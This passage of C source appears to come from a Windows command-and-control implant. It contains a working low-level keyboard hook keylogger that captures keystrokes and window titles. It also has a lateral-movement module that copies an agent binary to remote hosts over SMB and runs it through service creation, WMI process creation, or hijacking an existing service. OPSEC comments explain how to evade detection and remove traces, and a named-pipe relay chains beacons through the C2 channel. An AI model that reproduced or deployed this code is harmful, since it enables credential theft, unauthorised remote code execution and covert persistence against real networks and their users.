                case 0xDC: out[0] = shift ? '|' : '\\'; break;
                case 0xDD: out[0] = shift ? '}' : ']'; break;
                case 0xDE: out[0] = shift ? '"' : '\''; break;
                case 0x6A: out[0] = '*'; break;
                case 0x6B: out[0] = '+'; break;
                case 0x6D: out[0] = '-'; break;
                case 0x6E: out[0] = '.'; break;
                case 0x6F: out[0] = '/'; break;
                /* Modifiers — skip */
                case 0x10: case 0x11: case 0x12:
                case 0xA0: case 0xA1: case 0xA2: case 0xA3:
                case 0x5B: case 0x5C:
                    break;
                default:
                    if (vk >= 0x70 && vk <= 0x7B)
                        snprintf(out, sizeof(out), "[F%d]", vk - 0x6F);
                    break;
            }
        }

        if (out[0])
            buf_append(&_kl_buf, out, (DWORD)strlen(out));

        LeaveCriticalSection(&_kl_cs);
    }
    return _klCallNext(_kl_hook, nCode, wParam, lParam);
}

/* Hook thread — installs hook + runs message pump */
static DWORD WINAPI _kl_thread_func(LPVOID param) {
    _kl_fn_SetHook fnSetHook = (_kl_fn_SetHook)param;

    /* WH_KEYBOARD_LL: MSDN says pass NULL hMod when hook proc is in
       the current process (not a DLL) and dwThreadId is 0.
       Fallback: try with the exe module handle if NULL fails. */
    _kl_hook = fnSetHook(13 /*WH_KEYBOARD_LL*/, _kl_hook_proc, NULL, 0);
    if (!_kl_hook) {
        /* Retry with exe module handle */
        HMODULE hK32 = LoadLibraryA("kernel32.dll");
        _kl_fn_GetModHandle fnGMH = (_kl_fn_GetModHandle)GetProcAddress(hK32, "GetModuleHandleA");
        HMODULE hSelf = fnGMH ? fnGMH(NULL) : NULL;
        if (hSelf)
            _kl_hook = fnSetHook(13, _kl_hook_proc, hSelf, 0);
    }
    if (!_kl_hook) {
        _kl_last_error = GetLastError();
        InterlockedExchange(&_kl_active, 0);
        return 1;
    }

    /* Message pump — required for low-level hooks */
    HMODULE hU32 = LoadLibraryA("user32.dll");
    _kl_fn_GetMsg fnGetMsg = (_kl_fn_GetMsg)GetProcAddress(hU32, "GetMessageA");

    MSG msg;
    while (fnGetMsg(&msg, NULL, 0, 0) > 0) {
        /* WM_QUIT → GetMessage returns 0 → loop exits */
    }

    _kl_fn_Unhook fnUnhook = (_kl_fn_Unhook)GetProcAddress(hU32, "UnhookWindowsHookEx");
    if (fnUnhook && _kl_hook) { fnUnhook(_kl_hook); _kl_hook = NULL; }

    return 0;
}

void mod_keylogger(Buffer *out, const char *subcmd) {
    if (!subcmd || !*subcmd) {
        buf_append(out, "Usage: keylogger start|stop|dump", 31);
        return;
    }

    if (strcmp(subcmd, "start") == 0) {
        if (InterlockedCompareExchange(&_kl_active, 1, 0) == 1) {
            buf_append(out, "Keylogger already running", 25);
            return;
        }

        /* Init critical section once */
        if (!_kl_cs_init) { InitializeCriticalSection(&_kl_cs); _kl_cs_init = 1; }

        /* Clear previous capture and pre-allocate buffer */
        EnterCriticalSection(&_kl_cs);
        if (_kl_buf.data) free(_kl_buf.data);
        _kl_buf.cap = 4096;
        _kl_buf.data = (unsigned char *)malloc(4096);
        _kl_buf.len = 0;
        _kl_last_wnd[0] = '\0';
        LeaveCriticalSection(&_kl_cs);

        /* Resolve user32 functions */
        HMODULE hU32 = LoadLibraryA("user32.dll");
        if (!hU32) {
            InterlockedExchange(&_kl_active, 0);
            buf_append(out, "Failed to load user32.dll", 25);
            return;
        }

        _kl_fn_SetHook fnSetHook = (_kl_fn_SetHook)GetProcAddress(hU32, "SetWindowsHookExA");
        _klCallNext  = (_kl_fn_CallNext)   GetProcAddress(hU32, "CallNextHookEx");
        _klGetFgWnd  = (_kl_fn_GetFgWnd)   GetProcAddress(hU32, "GetForegroundWindow");
        _klGetWndTxt = (_kl_fn_GetWndTxt)  GetProcAddress(hU32, "GetWindowTextA");
        _klGetKS     = (_kl_fn_GetKeyState) GetProcAddress(hU32, "GetKeyState");

        if (!fnSetHook || !_klCallNext || !_klGetFgWnd || !_klGetWndTxt || !_klGetKS) {
            InterlockedExchange(&_kl_active, 0);
            buf_append(out, "Failed to resolve user32 functions", 34);
            return;
        }

        /* Launch hook thread — pass fnSetHook as param */
        _kl_thread = CreateThread(NULL, 0, _kl_thread_func,
                                  (LPVOID)fnSetHook, 0, &_kl_thread_id);
        if (!_kl_thread) {
            InterlockedExchange(&_kl_active, 0);
            buf_append(out, "Failed to create keylogger thread", 33);
            return;
        }

        Sleep(200); /* Let hook install */
        if (!_kl_active) {
            char errmsg[80];
            int n = snprintf(errmsg, sizeof(errmsg),
                             "Hook installation failed (err=%lu)", _kl_last_error);
            buf_append(out, errmsg, (DWORD)n);
            return;
        }

        buf_append(out, "Keylogger started", 17);
    }
    else if (strcmp(subcmd, "stop") == 0) {
        if (InterlockedCompareExchange(&_kl_active, 0, 1) == 0) {
            buf_append(out, "Keylogger not running", 21);
            return;
        }

        /* Signal hook thread to exit via WM_QUIT */
        HMODULE hU32 = LoadLibraryA("user32.dll");
        _kl_fn_PostThrdMsg fnPost = (_kl_fn_PostThrdMsg)GetProcAddress(hU32, "PostThreadMessageA");
        if (fnPost && _kl_thread_id)
            fnPost(_kl_thread_id, 0x0012 /*WM_QUIT*/, 0, 0);

        if (_kl_thread) {
            WaitForSingleObject(_kl_thread, 3000);
            CloseHandle(_kl_thread);
            _kl_thread = NULL;
            _kl_thread_id = 0;
        }

        /* Return captured keystrokes */
        EnterCriticalSection(&_kl_cs);
        if (_kl_buf.data && _kl_buf.len > 0) {
            const char *hdr = "Keylogger stopped — captured keystrokes:\r\n";
            buf_append(out, hdr, (DWORD)strlen(hdr));
            buf_append(out, _kl_buf.data, _kl_buf.len);
        } else {
            buf_append(out, "Keylogger stopped — no keystrokes captured", 43);
        }
        free(_kl_buf.data); _kl_buf.data = NULL;
        _kl_buf.len = 0; _kl_buf.cap = 0;
        LeaveCriticalSection(&_kl_cs);
    }
    else if (strcmp(subcmd, "dump") == 0) {
        if (!_kl_active) {
            buf_append(out, "Keylogger not running", 21);
            return;
        }

        EnterCriticalSection(&_kl_cs);
        if (_kl_buf.data && _kl_buf.len > 0) {
            buf_append(out, _kl_buf.data, _kl_buf.len);
            /* Clear after dump so next dump shows only new keys */
            _kl_buf.len = 0;
        } else {
            buf_append(out, "No keystrokes captured yet", 25);
        }
        LeaveCriticalSection(&_kl_cs);
    }
    else {
        buf_append(out, "Usage: keylogger start|stop|dump", 31);
    }
}

/* ─── Module: jump (lateral movement) ───
 *
 * Args wire format (packed by operator):
 *   [1 byte]  method: 0=psexec 1=wmiexec 2=scshell
 *   [4 bytes] target_len (LE)
 *   [N bytes] target hostname (null-terminated)
 *   [4 bytes] payload_len (LE)
 *   [N bytes] payload (agent .exe bytes)
 *
 * OPSEC notes:
 *   - All APIs resolved dynamically (no IAT entries)
 *   - psexec: random service name, binary uploaded as random .exe
 *             to ADMIN$, service deleted + binary deleted after start
 *   - wmiexec: upload via C$, execute via WMI Win32_Process.Create,
 *              binary deleted via WMI after spawn
 *   - scshell: NO file drop. Hijacks existing service binPath,
 *              restores original binPath after execution.
 *              Requires target to reach back to attacker SMB/pipe.
 */

/* Dynamic API typedefs for lateral movement */
typedef SC_HANDLE (WINAPI *fn_OpenSCManagerW)(LPCWSTR, LPCWSTR, DWORD);
typedef SC_HANDLE (WINAPI *fn_CreateServiceW)(SC_HANDLE, LPCWSTR, LPCWSTR,
    DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
typedef SC_HANDLE (WINAPI *fn_OpenServiceW)(SC_HANDLE, LPCWSTR, DWORD);
typedef BOOL      (WINAPI *fn_StartServiceW)(SC_HANDLE, DWORD, LPCWSTR*);
typedef BOOL      (WINAPI *fn_DeleteService)(SC_HANDLE);
typedef BOOL      (WINAPI *fn_CloseServiceHandle)(SC_HANDLE);
typedef BOOL      (WINAPI *fn_ChangeServiceConfigW)(SC_HANDLE, DWORD, DWORD, DWORD,
    LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR);
typedef BOOL      (WINAPI *fn_QueryServiceConfigW)(SC_HANDLE, LPQUERY_SERVICE_CONFIGW,
    DWORD, LPDWORD);
typedef BOOL      (WINAPI *fn_CopyFileW)(LPCWSTR, LPCWSTR, BOOL);
typedef BOOL      (WINAPI *fn_DeleteFileW)(LPCWSTR);

/* Generate pseudo-random alphanumeric name */
static void _jump_randname(char *buf, int len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    LARGE_INTEGER ctr;
    QueryPerformanceCounter(&ctr);
    DWORD seed = ctr.LowPart ^ GetCurrentThreadId();
    for (int i = 0; i < len; i++) {
        seed = seed * 1103515245 + 12345;
        buf[i] = charset[(seed >> 16) % (sizeof(charset) - 1)];
    }
    buf[len] = '\0';
}

static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
                         const unsigned char *payload, DWORD payload_len) {
    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    HMODULE hK32 = LoadLibraryA("kernel32.dll");
    if (!hAdv || !hK32) { BUF_STR(out, "[-] Failed to load libs\n"); return FALSE; }

    fn_OpenSCManagerW pOpenSCM = (fn_OpenSCManagerW)GetProcAddress(hAdv, "OpenSCManagerW");
    fn_CreateServiceW pCreateSvc = (fn_CreateServiceW)GetProcAddress(hAdv, "CreateServiceW");
    fn_StartServiceW pStartSvc = (fn_StartServiceW)GetProcAddress(hAdv, "StartServiceW");
    fn_DeleteService pDeleteSvc = (fn_DeleteService)GetProcAddress(hAdv, "DeleteService");
    fn_CloseServiceHandle pCloseSH = (fn_CloseServiceHandle)GetProcAddress(hAdv, "CloseServiceHandle");
    fn_CopyFileW pCopyFile = (fn_CopyFileW)GetProcAddress(hK32, "CopyFileW");
    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, "DeleteFileW");

    if (!pOpenSCM || !pCreateSvc || !pStartSvc || !pDeleteSvc || !pCloseSH ||
        !pCopyFile || !pDeleteFile) {
        BUF_STR(out, "[-] Failed to resolve SCM APIs\n");
        return FALSE;
    }

    /* 1. Write payload to \\target\ADMIN$\<random>.exe */
    char rname[9];
    _jump_randname(rname, 8);

    wchar_t remotePath[512];
    swprintf(remotePath, 512, L"\\\\%ls\\ADMIN$\\%hs.exe", target, rname);

    /* Write via direct file I/O to UNC path */
    HANDLE hFile = CreateFileW(remotePath, GENERIC_WRITE, 0,
                                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "[-] Failed to write to %ls (err=%lu)\n",
                 remotePath, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return FALSE;
    }
    DWORD written;
    WriteFile(hFile, payload, payload_len, &written, NULL);
    CloseHandle(hFile);

    char msg[256];
    snprintf(msg, sizeof(msg), "[+] Uploaded %lu bytes to \\\\%ls\\ADMIN$\\%s.exe\n",
             payload_len, target, rname);
    buf_append(out, msg, (DWORD)strlen(msg));

    /* 2. Connect to remote SCM */
    wchar_t scmTarget[256];
    swprintf(scmTarget, 256, L"\\\\%ls", target);
    SC_HANDLE hSCM = pOpenSCM(scmTarget, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        char err[128];
        snprintf(err, sizeof(err), "[-] OpenSCManager failed (err=%lu)\n", GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        pDeleteFile(remotePath);
        return FALSE;
    }

    /* 3. Create service with random name */
    wchar_t svcName[16], binPath[512];
    wchar_t wRname[16];
    MultiByteToWideChar(CP_UTF8, 0, rname, -1, wRname, 16);
    swprintf(svcName, 16, L"%ls", wRname);
    swprintf(binPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);

    SC_HANDLE hSvc = pCreateSvc(hSCM, svcName, NULL,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        binPath, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        char err[128];
        snprintf(err, sizeof(err), "[-] CreateService failed (err=%lu)\n", GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        pCloseSH(hSCM);
        pDeleteFile(remotePath);
        return FALSE;
    }

    snprintf(msg, sizeof(msg), "[+] Created service '%s' on %ls\n", rname, target);
    buf_append(out, msg, (DWORD)strlen(msg));

    /* 4. Start service (agent launches) */
    pStartSvc(hSvc, 0, NULL);
    /* Service start may "fail" because agent doesn't implement ServiceMain
       properly — that's expected. The process is spawned regardless. */

    Sleep(2000);

    /* 5. Cleanup: delete service + binary */
    pDeleteSvc(hSvc);
    pCloseSH(hSvc);
    pCloseSH(hSCM);
    pDeleteFile(remotePath);

    snprintf(msg, sizeof(msg), "[+] Service started and cleaned up on %ls\n", target);
    buf_append(out, msg, (DWORD)strlen(msg));
    return TRUE;
}

static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
                          const unsigned char *payload, DWORD payload_len) {
    /* scshell: hijack existing service's binPath, no file drop.
     * We change a stopped service's binPath to run the agent from a UNC path
     * or from a one-liner. The payload bytes are the agent binary — we need
     * to stage it somewhere the target can reach (e.g., SMB share on current host).
     *
     * For max OPSEC: we write the payload to a local temp share and point
     * the service at \\our_ip\share\agent.exe. But that requires knowing our IP.
     *
     * Simpler approach for now: upload to ADMIN$ (like psexec) but use an
     * existing service instead of creating a new one. This avoids the
     * "service creation" event (4697) which is heavily monitored.
     */
    (void)payload; (void)payload_len;

    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    HMODULE hK32 = LoadLibraryA("kernel32.dll");
    if (!hAdv || !hK32) { BUF_STR(out, "[-] Failed to load libs\n"); return FALSE; }

    fn_OpenSCManagerW pOpenSCM = (fn_OpenSCManagerW)GetProcAddress(hAdv, "OpenSCManagerW");
    fn_OpenServiceW pOpenSvc = (fn_OpenServiceW)GetProcAddress(hAdv, "OpenServiceW");
    fn_StartServiceW pStartSvc = (fn_StartServiceW)GetProcAddress(hAdv, "StartServiceW");
    fn_ChangeServiceConfigW pChangeCfg = (fn_ChangeServiceConfigW)GetProcAddress(hAdv, "ChangeServiceConfigW");
    fn_QueryServiceConfigW pQueryCfg = (fn_QueryServiceConfigW)GetProcAddress(hAdv, "QueryServiceConfigW");
    fn_CloseServiceHandle pCloseSH = (fn_CloseServiceHandle)GetProcAddress(hAdv, "CloseServiceHandle");
    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, "DeleteFileW");

    if (!pOpenSCM || !pOpenSvc || !pStartSvc || !pChangeCfg || !pQueryCfg || !pCloseSH) {
        BUF_STR(out, "[-] Failed to resolve SCM APIs\n");
        return FALSE;
    }

    /* 1. Upload payload to \\target\ADMIN$ */
    char rname[9];
    _jump_randname(rname, 8);
    wchar_t remotePath[512];
    swprintf(remotePath, 512, L"\\\\%ls\\ADMIN$\\%hs.exe", target, rname);

    HANDLE hFile = CreateFileW(remotePath, GENERIC_WRITE, 0,
                                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "[-] Failed to write to %ls (err=%lu)\n",
                 remotePath, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return FALSE;
    }
    DWORD written;
    WriteFile(hFile, payload, payload_len, &written, NULL);
    CloseHandle(hFile);

    /* 2. Connect to remote SCM */
    wchar_t scmTarget[256];
    swprintf(scmTarget, 256, L"\\\\%ls", target);
    SC_HANDLE hSCM = pOpenSCM(scmTarget, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        char err[128];
        snprintf(err, sizeof(err), "[-] OpenSCManager failed (err=%lu)\n", GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        pDeleteFile(remotePath);
        return FALSE;
    }

    /* 3. Open existing stoppable service — SensorService (common, usually stopped) */
    const wchar_t *svcName = L"SensorService";
    SC_HANDLE hSvc = pOpenSvc(hSCM, svcName, SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
    if (!hSvc) {
        /* Fallback: try BTAGService */
        svcName = L"BTAGService";
        hSvc = pOpenSvc(hSCM, svcName, SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
    }
    if (!hSvc) {
        char err[128];
        snprintf(err, sizeof(err), "[-] Failed to open target service (err=%lu)\n", GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        pCloseSH(hSCM);
        pDeleteFile(remotePath);
        return FALSE;
    }

    /* 4. Save original binPath */
    BYTE cfgBuf[8192];
    DWORD needed = 0;
    pQueryCfg(hSvc, (LPQUERY_SERVICE_CONFIGW)cfgBuf, sizeof(cfgBuf), &needed);
    QUERY_SERVICE_CONFIGW *origCfg = (QUERY_SERVICE_CONFIGW *)cfgBuf;
    wchar_t origBinPath[1024] = {0};
    if (origCfg->lpBinaryPathName)
        wcsncpy(origBinPath, origCfg->lpBinaryPathName, 1023);
    DWORD origSvcType = origCfg->dwServiceType;
    DWORD origStartType = origCfg->dwStartType;

    char msg[256];
    snprintf(msg, sizeof(msg), "[+] Hijacking service '%ls' on %ls\n", svcName, target);
    buf_append(out, msg, (DWORD)strlen(msg));

    /* 5. Change binPath to our payload */
    wchar_t newBinPath[512];
    swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);
    pChangeCfg(hSvc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
               SERVICE_ERROR_IGNORE, newBinPath, NULL, NULL, NULL, NULL, NULL, NULL);

    /* 6. Start service (agent launches) */
    pStartSvc(hSvc, 0, NULL);
    Sleep(2000);

    /* 7. Restore original binPath — critical for OPSEC */
    pChangeCfg(hSvc, origSvcType, origStartType,
               SERVICE_ERROR_IGNORE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);

    /* 8. Cleanup uploaded binary */
    pDeleteFile(remotePath);

    pCloseSH(hSvc);
    pCloseSH(hSCM);

    snprintf(msg, sizeof(msg), "[+] Service config restored, binary cleaned on %ls\n", target);
    buf_append(out, msg, (DWORD)strlen(msg));
    return TRUE;
}

static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
                          const unsigned char *payload, DWORD payload_len) {
    /* WMI lateral movement via COM/DCOM.
     * Upload payload to \\target\C$\Windows\Temp\<rand>.exe
     * then execute via Win32_Process.Create over DCOM. */

    HMODULE hK32 = LoadLibraryA("kernel32.dll");
    HMODULE hOle = LoadLibraryA("ole32.dll");
    HMODULE hOleaut = LoadLibraryA("oleaut32.dll");
    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, "DeleteFileW");

    if (!hOle || !hOleaut) {
        BUF_STR(out, "[-] Failed to load COM libs\n");
        return FALSE;
    }

    /* 1. Upload payload via SMB */
    char rname[9];
    _jump_randname(rname, 8);
    wchar_t remotePath[512];
    swprintf(remotePath, 512, L"\\\\%ls\\C$\\Windows\\Temp\\%hs.exe", target, rname);

    HANDLE hFile = CreateFileW(remotePath, GENERIC_WRITE, 0,
                                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "[-] Failed to write to %ls (err=%lu)\n",
                 remotePath, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return FALSE;
    }
    DWORD written;
    WriteFile(hFile, payload, payload_len, &written, NULL);
    CloseHandle(hFile);

    char msg[256];
    snprintf(msg, sizeof(msg), "[+] Uploaded %lu bytes to %ls\n", payload_len, remotePath);
    buf_append(out, msg, (DWORD)strlen(msg));

    /* 2. Initialize COM */
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        BUF_STR(out, "[-] CoInitializeEx failed\n");
        pDeleteFile(remotePath);
        return FALSE;
    }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL);
    /* May fail if already set — OK to ignore */

    /* 3. Connect to remote WMI via IWbemLocator */
    IWbemLocator *pLoc = NULL;
    /* CLSID_WbemLocator = {4590F811-1D3A-11D0-891F-00AA004B2E24} */
    CLSID clsid_WbemLocator = {0x4590F811, 0x1D3A, 0x11D0,
        {0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}};
    /* IID_IWbemLocator = {dc12a687-737f-11cf-884d-00aa004b2e24} */
    IID iid_IWbemLocator = {0xDC12A687, 0x737F, 0x11CF,
        {0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}};

    hr = CoCreateInstance(&clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &iid_IWbemLocator, (void **)&pLoc);
    if (FAILED(hr)) {
        char err[128];
        snprintf(err, sizeof(err), "[-] CoCreateInstance(WbemLocator) failed: 0x%lx\n", hr);
        buf_append(out, err, (DWORD)strlen(err));
        pDeleteFile(remotePath);
        CoUninitialize();
        return FALSE;
    }

    /* Build resource path: \\target\root\cimv2 */
    wchar_t wmiPath[512];
    swprintf(wmiPath, 512, L"\\\\%ls\\root\\cimv2", target);
    BSTR bstrPath = SysAllocString(wmiPath);

    IWbemServices *pSvc = NULL;
    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrPath, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    SysFreeString(bstrPath);

    if (FAILED(hr)) {
        char err[128];
        snprintf(err, sizeof(err), "[-] WMI ConnectServer failed: 0x%lx\n", hr);
        buf_append(out, err, (DWORD)strlen(err));
        pLoc->lpVtbl->Release(pLoc);
        pDeleteFile(remotePath);
        CoUninitialize();
        return FALSE;
    }

    /* Set security on proxy */
    CoSetProxyBlanket((IUnknown *)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    /* 4. Get Win32_Process class */
    BSTR bstrClass = SysAllocString(L"Win32_Process");
    BSTR bstrMethod = SysAllocString(L"Create");

    IWbemClassObject *pClass = NULL;
    hr = pSvc->lpVtbl->GetObject(pSvc, bstrClass, 0, NULL, &pClass, NULL);
    if (FAILED(hr)) {
        char err[128];
        snprintf(err, sizeof(err), "[-] GetObject(Win32_Process) failed: 0x%lx\n", hr);
        buf_append(out, err, (DWORD)strlen(err));
        SysFreeString(bstrClass);
        SysFreeString(bstrMethod);
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        pDeleteFile(remotePath);
        CoUninitialize();
        return FALSE;
    }

    /* Get method in-params */
    IWbemClassObject *pInParams = NULL;
    pClass->lpVtbl->GetMethod(pClass, bstrMethod, 0, &pInParams, NULL);

    IWbemClassObject *pInInst = NULL;
    pInParams->lpVtbl->SpawnInstance(pInParams, 0, &pInInst);

    /* Set CommandLine = "C:\Windows\Temp\<rand>.exe" */
    wchar_t cmdLine[512];
    swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe", rname);
    VARIANT vCmd;
    VariantInit(&vCmd);
    vCmd.vt = VT_BSTR;
    vCmd.bstrVal = SysAllocString(cmdLine);
    pInInst->lpVtbl->Put(pInInst, L"CommandLine", 0, &vCmd, 0);

    /* 5. Execute Win32_Process.Create */
    IWbemClassObject *pOutParams = NULL;
    hr = pSvc->lpVtbl->ExecMethod(pSvc, bstrClass, bstrMethod, 0, NULL,
                                   pInInst, &pOutParams, NULL);

    BOOL success = FALSE;
    if (SUCCEEDED(hr)) {
        VARIANT vRet;
        VariantInit(&vRet);
        pOutParams->lpVtbl->Get(pOutParams, L"ReturnValue", 0, &vRet, NULL, NULL);
        int retVal = (vRet.vt == VT_I4) ? vRet.intVal : -1;
        VariantClear(&vRet);

        if (retVal == 0) {
            VARIANT vPid;
            VariantInit(&vPid);
            pOutParams->lpVtbl->Get(pOutParams, L"ProcessId", 0, &vPid, NULL, NULL);
            snprintf(msg, sizeof(msg), "[+] Process created on %ls (PID: %d)\n",
                     target, vPid.intVal);
            buf_append(out, msg, (DWORD)strlen(msg));
            VariantClear(&vPid);
            success = TRUE;
        } else {
            snprintf(msg, sizeof(msg), "[-] Win32_Process.Create returned %d\n", retVal);
            buf_append(out, msg, (DWORD)strlen(msg));
        }
        pOutParams->lpVtbl->Release(pOutParams);
    } else {
        snprintf(msg, sizeof(msg), "[-] ExecMethod failed: 0x%lx\n", hr);
        buf_append(out, msg, (DWORD)strlen(msg));
    }

    /* Cleanup COM */
    VariantClear(&vCmd);
    pInInst->lpVtbl->Release(pInInst);
    pInParams->lpVtbl->Release(pInParams);
    pClass->lpVtbl->Release(pClass);
    SysFreeString(bstrClass);
    SysFreeString(bstrMethod);
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    /* Schedule binary cleanup — give agent time to start */
    if (success) {
        Sleep(3000);
        pDeleteFile(remotePath);
        BUF_STR(out, "[+] Remote binary cleaned up\n");
    } else {
        pDeleteFile(remotePath);
    }
    return success;
}

void mod_jump(Buffer *out, const unsigned char *args, DWORD args_len) {
    if (!args || args_len < 10) {
        BUF_STR(out, "[-] Invalid jump arguments\n");
        return;
    }

    /* Parse wire format */
    DWORD off = 0;
    BYTE method = args[off++]; /* 0=psexec, 1=wmiexec, 2=scshell */

    DWORD tgt_len = *(DWORD *)(args + off); off += 4;
    if (off + tgt_len > args_len) {
        BUF_STR(out, "[-] Malformed jump args (target)\n");
        return;
    }
    char target[256] = {0};
    memcpy(target, args + off, tgt_len > 255 ? 255 : tgt_len);
    off += tgt_len;

    if (off + 4 > args_len) {
        BUF_STR(out, "[-] Malformed jump args (payload len)\n");
        return;
    }
    DWORD payload_len = *(DWORD *)(args + off); off += 4;
    if (off + payload_len > args_len) {
        BUF_STR(out, "[-] Malformed jump args (payload truncated)\n");
        return;
    }
    const unsigned char *payload = args + off;

    /* Convert target to wide */
    wchar_t wTarget[256] = {0};
    MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);

    char msg[256];
    const char *method_names[] = {"psexec", "wmiexec", "scshell"};
    if (method > 2) { BUF_STR(out, "[-] Unknown jump method\n"); return; }
    snprintf(msg, sizeof(msg), "[*] jump %s → %s (%lu byte payload)\n",
             method_names[method], target, payload_len);
    buf_append(out, msg, (DWORD)strlen(msg));

    switch (method) {
        case 0: _jump_psexec(out, wTarget, payload, payload_len); break;
        case 1: _jump_wmiexec(out, wTarget, payload, payload_len); break;
        case 2: _jump_scshell(out, wTarget, payload, payload_len); break;
    }
}

/* ─── Module: link (connect to remote SMB pipe for beacon chaining) ─── */

#define MAX_LINKED_AGENTS 8

typedef struct {
    HANDLE hPipe;
    HANDLE hThread;
    volatile LONG active;
    char target[256];
    char pipename[256];
} LinkedAgent;

static LinkedAgent _linked[MAX_LINKED_AGENTS];
static volatile LONG _linked_count = 0;
static BOOL _linked_init_done = FALSE;

static void _link_init_once(void) {
    if (_linked_init_done) return;
    for (int i = 0; i < MAX_LINKED_AGENTS; i++) {
        _linked[i].hPipe = INVALID_HANDLE_VALUE;
        _linked[i].hThread = NULL;
        _linked[i].active = 0;
        _linked[i].target[0] = '\0';
        _linked[i].pipename[0] = '\0';
    }
    _linked_init_done = TRUE;
}

/* Read length-prefixed message from pipe */
static BOOL _link_pipe_read(HANDLE pipe, unsigned char **data, DWORD *len) {
    DWORD bytes_read;
    DWORD msg_len;
    if (!ReadFile(pipe, &msg_len, 4, &bytes_read, NULL) || bytes_read != 4)
        return FALSE;
    if (msg_len == 0 || msg_len > 16 * 1024 * 1024) /* 16MB sanity */
        return FALSE;
    *data = (unsigned char *)malloc(msg_len);
    if (!*data) return FALSE;
    DWORD total = 0;
    while (total < msg_len) {
        if (!ReadFile(pipe, *data + total, msg_len - total, &bytes_read, NULL) || bytes_read == 0) {
            free(*data); *data = NULL;
            return FALSE;
        }
        total += bytes_read;
    }
    *len = msg_len;
    return TRUE;
}

/* Write length-prefixed message to pipe */
static BOOL _link_pipe_write(HANDLE pipe, const unsigned char *data, DWORD len) {
    DWORD written;
    DWORD net_len = len;
    if (!WriteFile(pipe, &net_len, 4, &written, NULL) || written != 4)
        return FALSE;
    DWORD total = 0;
    while (total < len) {
        if (!WriteFile(pipe, data + total, len - total, &written, NULL))
            return FALSE;
        total += written;
    }
    return TRUE;
}

/*
 * Relay thread: reads child check-ins from the pipe, forwards through
 * the parent's active C2 channel, writes responses back.
 * Runs until the pipe disconnects or the link is explicitly torn down.
 */
static DWORD WINAPI _link_relay_thread(LPVOID param) {
    int idx = (int)(intptr_t)param;
    HANDLE pipe = _linked[idx].hPipe;

    DBG("[link] relay thread started for slot %d (%s)", idx, _linked[idx].target);

    while (_linked[idx].active) {
        unsigned char *child_data = NULL;
        DWORD child_len = 0;

        /* Read child's check-in / result packet */
        if (!_link_pipe_read(pipe, &child_data, &child_len))
            break;

        /* Relay through parent's C2 channel */
        unsigned char *resp = NULL;
        DWORD resp_len = 0;
        BOOL ok = channel_send_recv(child_data, child_len, &resp, &resp_len);
        free(child_data);

        if (!ok || !resp) {
            if (resp) free(resp);
            break;
        }

        /* Write C2 response back to child */
        if (!_link_pipe_write(pipe, resp, resp_len)) {
            free(resp);
            break;
        }
        free(resp);
    }

    DBG("[link] relay thread exiting for slot %d (%s)", idx, _linked[idx].target);
    CloseHandle(pipe);
    _linked[idx].hPipe = INVALID_HANDLE_VALUE;
    InterlockedExchange(&_linked[idx].active, 0);
    InterlockedDecrement(&_linked_count);
    return 0;
}

